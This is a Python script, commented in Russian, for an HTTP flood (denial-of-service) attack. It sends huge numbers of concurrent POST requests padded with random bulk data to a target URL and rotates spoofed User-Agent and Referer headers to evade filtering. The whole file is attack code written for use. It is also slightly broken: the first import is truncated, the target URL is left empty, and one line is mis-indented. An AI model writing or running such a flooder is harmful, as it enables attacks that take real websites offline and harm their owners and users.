mport random
import aiohttp
import time
import asyncio

# Целевой сервер
URL = 

# Генерация случайных заголовков
def random_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36'
    ]
    referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://yandex.ru/",
        "https://duckduckgo.com/"
    ]
    
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }

# Рандомные данные в запросе для нагрузки
def random_data():
    return {"data": "X" * random.randint(10000, 20000)}

# Асинхронный запрос
async def attack_request(session):
    headers = random_headers()
    data = random_data()

    try:
        async with session.post(URL, headers=headers, timeout=10, data=data) as response:
            print(f"Request sent! Status: {response.status}")
    except asyncio.TimeoutError:
        print("Request timeout!")
    except Exception as e:
        print(f"Error: {e}")

# Запуск мощной атаки
async def run_attack(total_requests, concurrent_requests):
    async with aiohttp.ClientSession() as session:
        while total_requests > 0:
            tasks = [attack_request(session) for _ in range(min(concurrent_requests, total_requests))]
            await asyncio.gather(*tasks)
 total_requests -= concurrent_requests

# Главная функция атаки
def start_attack():
    total_requests = 100000000000000
    concurrent_requests = 1000000

    start_time = time.time()
    asyncio.run(run_attack(total_requests, concurrent_requests))
    print(f"Attack finished in {time.time() - start_time} seconds.")

if __name__ == "__main__":
    start_attack()
